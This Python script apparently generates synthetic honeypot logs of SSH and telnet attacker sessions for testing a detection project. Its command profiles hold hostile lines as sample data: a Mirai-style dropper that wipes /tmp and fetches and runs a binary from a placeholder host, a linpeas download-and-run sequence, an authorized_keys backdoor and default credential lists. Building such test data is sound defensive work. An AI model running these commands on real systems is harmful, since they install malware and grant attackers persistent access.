#!/usr/bin/env python3
import json
import random
import uuid
import datetime
import ipaddress
import time
import os

OUTPUT_FILE = "/Users/tanhiowyatt/projects/cyanide/var/log/cyanide/cyanide_synthetic.json"
TARGET_COUNT = 3000

# Feature Data
USERNAMES = ["root", "admin", "user", "support", "ubuntu", "test", "oracle", "guest"]
PASSWORDS = ["123456", "password", "admin", "admin123", "root", "qwerty", "1234", "pass"]
PROTOCOLS = ["ssh", "telnet"]
CLIENT_VERSIONS = [
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
    "SSH-2.0-PuTTY_Release_0.76",
    "SSH-2.0-libssh-0.9.6",
    "SSH-2.0-dropbear_2020.81",
    "Telnet"
]

# IP Pools (Simulating different attackers from different regions/subnets)
def generate_random_ip():
    return str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))

ATTACKER_IPS = [generate_random_ip() for _ in range(50)] # 50 unique attackers

# Command Profiles
PROFILES = {
    "botnet": [
        "enable",
        "shell",
        "sh",
        "/bin/busybox cat /proc/mounts",
        "/bin/busybox echo -ne '\\x6b\\x61\\x6d\\x69'",
        "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://{malware_ip}/bins/mirai.mpsl -O - > mpsl;sh mpsl;busybox tftp -r mirai.mpsl -g {malware_ip};sh mirai.mpsl",
        "rm mpsl"
    ],
    "recon": [
        "uname -a",
        "id",
        "whoami",
        "w",
        "cat /proc/cpuinfo",
        "free -m",
        "ps aux",
        "ls -la /tmp",
        "cat /etc/issue",
        "ip addr"
    ],
    "manual_hacker": [
        "ls -la",
        "pwd",
        "cd /var/www/html",
        "ls",
        "cat config.php",
        "grep -r 'password' .",
        "cd /tmp",
        "wget http://{malware_ip}/linpeas.sh",
        "chmod +x linpeas.sh",
        "./linpeas.sh",
        "cat /etc/passwd",
        "echo 'ssh-rsa AAAAB3...' >> /root/.ssh/authorized_keys"
    ],
    "script_kiddie": [
        "help",
        "?",
        "start",
        "list",
        "sudo su",
        "shutdown",
        "reboot"
    ]
}

def get_timestamp(start_time, offset_seconds):
    dt = start_time + datetime.timedelta(seconds=offset_seconds)
    return dt.isoformat()

def generate_log_entry(event_type, timestamp, session_id, src_ip, **kwargs):
    entry = {
        "eventid": event_type,
        "timestamp": timestamp,
        "session": session_id,
        "src_ip": src_ip
    }
    entry.update(kwargs)
    return entry

def main():
    print(f"[*] Generating {TARGET_COUNT} logs to {OUTPUT_FILE}...")
    
    logs = []
    current_time = datetime.datetime.now() - datetime.timedelta(days=1) # Start from yesterday
    
    generated_count = 0
    
    while generated_count < TARGET_COUNT:
        # Start a new session
        src_ip = random.choice(ATTACKER_IPS)
        # 10% chance of a new completely random IP (drive-by)
        if random.random() < 0.1:
            src_ip = generate_random_ip()
            
        session_id = uuid.uuid4().hex[:8]
        protocol = random.choice(PROTOCOLS)
        client_ver = random.choice(CLIENT_VERSIONS) if protocol == "ssh" else "Telnet"
        
        # Connect
        current_time += datetime.timedelta(milliseconds=random.randint(100, 2000))
        logs.append(generate_log_entry("connect", current_time.isoformat(), session_id, src_ip, 
                                     protocol=protocol, src_port=random.randint(1024, 65535)))
        generated_count += 1
        
        # Profile selection
        profile_name = random.choices(
            ["botnet", "recon", "manual_hacker", "script_kiddie"], 
            weights=[0.4, 0.3, 0.2, 0.1]
        )[0]
        commands = PROFILES[profile_name]
        
        # Authentication attempts
        # Botnets/Kiddies try many, Manual might try once or twice specific
        num_auth_attempts = random.randint(1, 5) if profile_name != "manual_hacker" else random.randint(1, 3)
        successful_auth = False
        
        for _ in range(num_auth_attempts):
            username = random.choice(USERNAMES)
            password = random.choice(PASSWORDS)
            
            # 30% success rate generally, higher for manual
            success_prob = 0.5 if profile_name == "manual_hacker" else 0.3
            success = random.random() < success_prob
            
            current_time += datetime.timedelta(milliseconds=random.randint(200, 1000))
            logs.append(generate_log_entry("auth", current_time.isoformat(), session_id, src_ip,
                                         protocol=protocol, username=username, password=password, success=success))
            generated_count += 1
            
            if success:
                successful_auth = True
                break
        
        if successful_auth:
            # Client Fingerprint (SSH only usually)
            if protocol == "ssh":
                current_time += datetime.timedelta(milliseconds=50)
                logs.append(generate_log_entry("client_fingerprint", current_time.isoformat(), session_id, src_ip,
                                             protocol=protocol, client_version=client_ver,
                                             fingerprint={"kex": "unknown", "key_algo": "unknown"}))
                generated_count += 1
            
            # Execute Commands
            malware_ip = generate_random_ip()
            cmd_list = [c.format(malware_ip=malware_ip) for c in commands]
            
            # Determine how many commands to run from the profile
            num_cmds = random.randint(1, len(cmd_list))
            
            for cmd in cmd_list[:num_cmds]:
                if generated_count >= TARGET_COUNT: break
                
                # Typing delay
                current_time += datetime.timedelta(milliseconds=random.randint(500, 3000))
                
                # Command Input
                logs.append(generate_log_entry("command.input", current_time.isoformat(), session_id, src_ip,
                                             username=username, protocol=protocol, input=cmd, client_version=client_ver))
                generated_count += 1
                
                # React to command (Mocking responses/events)
                if "wget" in cmd or "curl" in cmd:
                    logs.append(generate_log_entry("ioc_detected", current_time.isoformat(), session_id, src_ip,
                                                 iocs=[malware_ip], cmd=cmd))
                    generated_count += 1
                
                if "cat /etc/passwd" in cmd:
                    logs.append(generate_log_entry("fs_audit", current_time.isoformat(), session_id, src_ip,
                                                 action="read", path="/etc/passwd"))
                    generated_count += 1
                
                # Random "command not found" (typos)
                if random.random() < 0.1:
                    typo = cmd + "x"
                    current_time += datetime.timedelta(milliseconds=200)
                    logs.append(generate_log_entry("command_not_found", current_time.isoformat(), session_id, src_ip,
                                                 cmd=typo))
                    generated_count += 1

        # Disconnect
        current_time += datetime.timedelta(milliseconds=random.randint(100, 1000))
        logs.append(generate_log_entry("session_disconnect", current_time.isoformat(), session_id, src_ip,
                                     reason="clean" if successful_auth else "auth_fail"))
        generated_count += 1

    # Ensure directory exists
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    
    # Sort by timestamp just in case
    # logs.sort(key=lambda x: x['timestamp']) 
    
    # Write to file (appending as JSONL primarily based on existing file format, but let's check)
    # The existing file `cyanide.json` is JSONL (one JSON object per line).
    
    with open(OUTPUT_FILE, "w") as f:
        for log in logs:
            f.write(json.dumps(log) + "\n")
            
    print(f"[+] Successfully generated {len(logs)} logs to {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
